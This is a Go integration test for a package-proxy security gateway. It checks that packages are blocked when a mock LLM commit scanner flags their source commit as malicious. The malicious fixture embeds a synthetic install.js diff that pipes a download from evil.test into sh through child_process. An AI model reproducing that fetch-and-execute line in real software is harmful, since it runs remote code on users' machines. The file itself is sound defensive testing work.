//go:build integration
// +build integration

package e2e

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"

	"github.com/blechschmidt/pullthrough-security/internal/backends"
	"github.com/blechschmidt/pullthrough-security/internal/backends/httpbackend"
	"github.com/blechschmidt/pullthrough-security/internal/cache"
	"github.com/blechschmidt/pullthrough-security/internal/findings"
	"github.com/blechschmidt/pullthrough-security/internal/policy"
	"github.com/blechschmidt/pullthrough-security/internal/provenance"
	"github.com/blechschmidt/pullthrough-security/internal/proxy"
	"github.com/blechschmidt/pullthrough-security/internal/scan/commit"
	"github.com/blechschmidt/pullthrough-security/internal/testset"
	"github.com/blechschmidt/pullthrough-security/internal/upstream"
)

// maliciousMarker is a plain alphanumeric sentinel the mock LLM keys on. It is
// embedded in a "bad" commit's message and diff; the mock provider returns a
// malicious verdict for any prompt containing it and a benign verdict otherwise.
// It is deliberately alphanumeric so the pipeline's prompt-defanging pass
// (zero-width stripping, injection-directive wrapping, boundary escaping) passes
// it through unchanged — the mock keys on content that genuinely reaches the
// model, exactly as a real provider would see it.
const maliciousMarker = "PTE2EMALICIOUSMARKER"

// benignVerdictJSON and maliciousVerdictJSON are the two responses the mock LLM
// emits. They are the exact JSON shape the real Claude/OpenAI providers are
// instructed to return (internal/scan/commit/prompt.go parses this), so the
// pipeline's verdict-parsing, sanitizing, and scoring run for real.
const benignVerdictJSON = `{"riskScore": 4, "malicious": false, "rationale": "routine dependency bump; no supply-chain risk", "findings": []}`

const maliciousVerdictJSON = `{"riskScore": 96, "malicious": true, "rationale": "the commit injects a build-time backdoor that exfiltrates credentials", "findings": [` +
	`{"category": "backdoor", "severity": "critical", "title": "Build-time backdoor", "detail": "post-install hook downloads and executes a remote payload", "file": "install.js", "line": 1, "confidence": 0.97}]}`

// mockLLM is a deterministic, offline Provider standing in for Claude/Codex. It
// records how many completions it served (proving the scan ran) and decides the
// verdict purely from the prompt content: a prompt carrying the malicious marker
// gets the malicious verdict, everything else the benign one.
type mockLLM struct {
	name  string
	calls atomic.Int64
}

func (m *mockLLM) Name() string {
	if m.name == "" {
		return "mock-llm"
	}
	return m.name
}

func (m *mockLLM) Complete(_ context.Context, req commit.Request) (string, commit.Usage, error) {
	m.calls.Add(1)
	usage := commit.Usage{InputTokens: 128, OutputTokens: 48}
	if strings.Contains(req.User, maliciousMarker) {
		return maliciousVerdictJSON, usage, nil
	}
	return benignVerdictJSON, usage, nil
}

// staticResolver is a provenance.Resolver that maps a package coordinate
// (name@version) to a pre-seeded source-commit link. It stands in for the
// ecosystem-metadata / attestation resolvers so the integration test controls
// exactly which commit each package is associated with.
type staticResolver struct {
	links map[string]*provenance.Link
}

func (r *staticResolver) Name() string { return "e2e-static-provenance" }

func (r *staticResolver) Resolve(_ context.Context, art provenance.Artifact) (*provenance.Link, error) {
	if l, ok := r.links[art.Name+"@"+art.Version]; ok {
		return l, nil
	}
	return nil, provenance.ErrNoProvenance
}

// pipelineVerdicts adapts the commit pipeline's persisted verdicts to the
// provenance VerdictLookup join interface, mirroring the production
// scanVerdictLookup in cmd/pullthrough.
type pipelineVerdicts struct{ pipeline *commit.Pipeline }

func (pv *pipelineVerdicts) VerdictFor(ctx context.Context, sha string) (*provenance.CommitVerdict, bool) {
	v, err := pv.pipeline.Get(ctx, sha)
	if err != nil || v == nil {
		return nil, false
	}
	return &provenance.CommitVerdict{
		SHA:             v.SHA,
		RiskScore:       v.RiskScore,
		Malicious:       v.Malicious,
		HighestSeverity: v.HighestSeverity(),
		Findings:        len(v.Findings),
	}, true
}

// provAssessor adapts the provenance Service to policy.AssessmentSource exactly
// as the production provenanceAssessor (cmd/pullthrough/main.go) does: it
// resolves the artifact's provenance link joined with its source commit's scan
// verdict and flattens both into a policy.Assessment. This is the real,
// wired-in-production bridge between the LLM commit scan and the package
// admission decision.
type provAssessor struct{ svc *provenance.Service }

func (a *provAssessor) Assess(ctx context.Context, art policy.Artifact) (policy.Assessment, error) {
	enriched, err := a.svc.ResolveEnriched(ctx, provenance.Artifact{
		Ecosystem: art.Ecosystem,
		Name:      art.Name,
		Version:   art.Version,
		Digest:    art.Digest,
	})
	if err != nil {
		if errors.Is(err, provenance.ErrNoProvenance) {
			return policy.Assessment{Found: false}, nil
		}
		return policy.Assessment{}, err
	}
	asmt := policy.Assessment{
		Found:             true,
		Confidence:        string(enriched.Link.Confidence),
		SignatureVerified: enriched.Link.SignatureVerified,
		ChainTrusted:      enriched.Link.ChainTrusted,
		CommitSHA:         enriched.Link.CommitSHA,
		RepositoryURL:     enriched.Link.RepositoryURL,
	}
	if v := enriched.Verdict; v != nil {
		asmt.HasVerdict = true
		asmt.RiskScore = v.RiskScore
		asmt.Malicious = v.Malicious
		asmt.HighestSeverity = v.HighestSeverity
	}
	return asmt, nil
}

// llmScenario is a fully-wired, single-backend in-process environment for one
// fixture whose package pulls are gated on the LLM commit-scan verdict of their
// associated source commit, via the production provenance → policy bridge.
type llmScenario struct {
	fixture  testset.Fixture
	handler  http.Handler
	up       *recordedUpstream
	store    *findings.Store
	provider *mockLLM
	pipeline *commit.Pipeline
	cleanup  func()
}

// buildLLMScenario wires a scenario for a fixture. The fixture's package
// coordinate is associated with a single synthetic source commit; that commit is
// scanned up-front by the real commit pipeline driven by the mock LLM. When
// malicious is true the commit's diff carries the malicious marker, so the mock
// LLM flags it and the policy gate (BlockMalicious) must refuse the pull; when
// false the commit is benign and the pull must be admitted.
func buildLLMScenario(f testset.Fixture, malicious bool) (*llmScenario, error) {
	up := newRecordedUpstream()
	srv := httptest.NewServer(up)

	// Record a body for each of the fixture's resources so the recorded upstream
	// can serve a cold fill (the allow path needs real bytes to reach 200).
	artifactRest := map[string]bool{}
	for _, p := range f.Pulls {
		if pullMethod(p) != http.MethodGet {
			continue
		}
		rest := restOf(f.Backend, p.Path)
		if p.Kind == testset.KindArtifact {
			artifactRest[rest] = true
			up.record(rest, artifactBody(rest))
		} else {
			up.record(rest, indexBody(rest))
		}
	}

	cacheable := func(r *backends.Request) bool {
		if r.Method != http.MethodGet && r.Method != http.MethodHead {
			return false
		}
		return artifactRest[strings.SplitN(r.Path, "?", 2)[0]]
	}
	coordinator := func(r *backends.Request) (backends.Coordinate, bool) {
		if artifactRest[strings.SplitN(r.Path, "?", 2)[0]] {
			return backends.Coordinate{Name: f.Dep.Name, Version: f.Dep.Version}, true
		}
		return backends.Coordinate{}, false
	}

	inner, err := httpbackend.New(httpbackend.Options{
		Name:        f.Backend,
		BaseURL:     srv.URL,
		Client:      upstream.NewWithHTTPClient(http.DefaultClient, "e2e/1"),
		Cacheable:   cacheable,
		Coordinator: coordinator,
	})
	if err != nil {
		srv.Close()
		return nil, err
	}
	backend := &recordingBackend{Backend: inner, artifactRest: artifactRest}

	registry := backends.NewRegistry()
	if err := registry.Register(backend); err != nil {
		srv.Close()
		return nil, err
	}

	// The commit-scanning pipeline driven by the mock LLM. EscalateAtScore is set
	// above 100 so only the (single) triage pass runs — the mock's verdict is
	// authoritative and the pipeline makes exactly one provider call per commit.
	provider := &mockLLM{name: "mock-llm"}
	pipeline, err := commit.New(provider, commit.NewMemoryStore(), commit.Config{
		TriageModel:     "mock-triage",
		DeepModel:       "mock-deep",
		EscalateAtScore: 200,
	}, discardLogger())
	if err != nil {
		srv.Close()
		return nil, err
	}

	// Associate the fixture's package with a synthetic source commit and scan that
	// commit now, so a persisted verdict exists for the policy gate to read. The
	// SHA differs between the benign and malicious variants so the two verdicts
	// never collide in the shared memory store.
	sha := commitSHAFor(f, malicious)
	if _, err := pipeline.Scan(context.Background(), syntheticCommit(f, sha, malicious)); err != nil {
		srv.Close()
		return nil, fmt.Errorf("pre-scanning source commit: %w", err)
	}

	resolver := &staticResolver{links: map[string]*provenance.Link{
		f.Dep.Name + "@" + f.Dep.Version: {
			Artifact:      provenance.Artifact{Ecosystem: f.Backend, Name: f.Dep.Name, Version: f.Dep.Version},
			RepositoryURL: "https://example.test/" + f.Backend + "/" + f.Dep.Name,
			CommitSHA:     sha,
			Confidence:    provenance.ConfidenceClaimed,
			ResolverName:  "e2e-static-provenance",
		},
	}}
	provSvc := provenance.NewService(provenance.ServiceOptions{
		Resolvers: []provenance.Resolver{resolver},
		Store:     provenance.NewMemoryLinkStore(),
		Verdicts:  &pipelineVerdicts{pipeline: pipeline},
		Logger:    discardLogger(),
	})

	// The admission policy: block any artifact whose source commit the scanner
	// flagged malicious. A package with no provenance is admitted (so the index
	// pulls and any unmapped coordinate pass through); an unscanned commit warns.
	pol := policy.New(policy.Config{
		FailClosed: true,
		Default: policy.Rule{
			BlockMalicious:      true,
			OnMissingProvenance: policy.ActionAllow,
			OnMissingScan:       policy.ActionWarn,
		},
	}, &provAssessor{svc: provSvc}, discardLogger())

	store := findings.NewStore(findings.StoreOptions{})

	deps := proxy.Dependencies{
		Logger:     discardLogger(),
		Cache:      cache.NewMemoryCache(),
		Backends:   registry,
		Ecosystems: map[string]string{f.Backend: f.Backend},
		Findings:   store,
		Provenance: provSvc,
		Policy:     pol,
	}
	gw, err := proxy.New(deps, proxy.Options{HTTPAddr: ":0"})
	if err != nil {
		srv.Close()
		return nil, err
	}

	return &llmScenario{
		fixture:  f,
		handler:  gw.Handler(),
		up:       up,
		store:    store,
		provider: provider,
		pipeline: pipeline,
		cleanup:  srv.Close,
	}, nil
}

// get issues a client-style GET against the gateway.
func (s *llmScenario) get(ctx context.Context, pullPath string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodGet, pullPath, nil).WithContext(ctx)
	rec := httptest.NewRecorder()
	s.handler.ServeHTTP(rec, req)
	return rec
}

// commitSHAFor returns a deterministic 40-hex synthetic commit SHA for a fixture
// variant. The leading nibble distinguishes benign (b) from malicious (a).
func commitSHAFor(f testset.Fixture, malicious bool) string {
	lead := byte('b')
	if malicious {
		lead = 'a'
	}
	seed := f.Backend
	var sb strings.Builder
	sb.WriteByte(lead)
	for i := 1; i < 40; i++ {
		sb.WriteByte("0123456789abcdef"[(int(seed[i%len(seed)])+i)%16])
	}
	return sb.String()
}

// syntheticCommit builds the Commit the pipeline scans. The malicious variant
// embeds the marker the mock LLM keys on in both the message and the diff; the
// benign variant is a plain dependency bump.
func syntheticCommit(f testset.Fixture, sha string, malicious bool) *commit.Commit {
	if malicious {
		return &commit.Commit{
			SHA:           sha,
			RepositoryURL: "https://example.test/" + f.Backend + "/" + f.Dep.Name,
			Message:       "chore: add install helper " + maliciousMarker,
			Files: []commit.FileDiff{{
				Path:   "install.js",
				Status: "A",
				Patch:  "@@ -0,0 +1,2 @@\n+// " + maliciousMarker + "\n+require('child_process').exec('curl https://evil.test/x | sh')\n",
			}},
		}
	}
	return &commit.Commit{
		SHA:           sha,
		RepositoryURL: "https://example.test/" + f.Backend + "/" + f.Dep.Name,
		Message:       "chore(deps): bump " + f.Dep.Name + " to " + f.Dep.Version,
		Files: []commit.FileDiff{{
			Path:   "README.md",
			Status: "M",
			Patch:  "@@ -1,1 +1,1 @@\n-version " + f.Dep.Version + "\n+version " + f.Dep.Version + " (docs)\n",
		}},
	}
}
